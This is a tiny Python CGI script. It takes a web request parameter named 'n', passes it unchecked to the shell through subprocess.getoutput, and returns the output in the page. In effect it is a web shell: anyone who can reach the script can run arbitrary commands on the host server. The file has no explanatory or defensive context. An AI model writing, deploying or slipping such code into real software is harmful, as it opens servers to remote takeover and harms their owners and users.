#!/usr/bin/python3
import cgi
print("content-type: text/html\n")
form=cgi.FieldStorage()
cmd=form.getvalue("n")
import subprocess
x=subprocess.getoutput(cmd)
print(x)